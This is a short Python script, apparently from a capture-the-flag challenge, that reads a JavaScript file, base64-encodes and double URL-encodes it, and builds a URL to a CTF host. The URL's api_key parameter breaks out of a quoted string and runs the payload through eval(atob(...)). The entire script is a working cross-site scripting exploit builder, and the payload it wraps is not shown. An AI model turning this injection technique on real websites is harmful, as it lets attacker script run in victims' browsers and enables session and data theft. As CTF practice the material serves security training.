#!/usr/bin/env python3
import base64
import urllib.parse

payload = open('stage1.js', 'r').read()
url = f'https://wimc.ctf.allesctf.net/?api_key="-eval(atob("{urllib.parse.quote(urllib.parse.quote(base64.b64encode(payload.encode()).decode()))}"))-"'
print(url)
